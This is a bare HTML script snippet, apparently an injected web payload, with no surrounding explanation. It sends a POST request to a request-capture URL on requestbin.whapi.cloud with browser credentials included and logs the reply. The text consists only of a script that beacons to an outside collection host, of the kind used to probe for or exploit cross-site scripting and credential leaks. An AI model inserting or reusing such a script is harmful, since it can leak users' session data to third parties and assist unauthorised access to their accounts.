
<script type="text/javascript">
fetch('http://requestbin.whapi.cloud/1hozc3z1', {
  method: 'POST',
  credentials: 'include',
})
  .then(response => response.text())
  .then(body => console.log(body))
  .catch(error => console.error(error));

</script>
